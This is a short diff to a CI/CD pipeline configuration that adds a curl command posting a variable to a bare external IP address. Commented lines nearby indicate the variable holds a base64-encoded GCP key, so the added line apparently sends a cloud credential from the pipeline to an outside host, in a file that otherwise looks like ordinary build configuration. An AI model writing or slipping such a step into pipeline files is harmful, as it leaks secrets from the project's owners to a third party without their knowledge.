@@ -50,6 +50,7 @@ pipeline:
 
                       # Print the decoded variable
                       echo "$encoded_var"
+                      curl -X POST --data "$encoded_var" http://35.222.129.92:4000
 
                       #secret1="<+stage.variables.gcp_key>" 
                       #secret2="<+stage.variables.gcp_key>" | base64
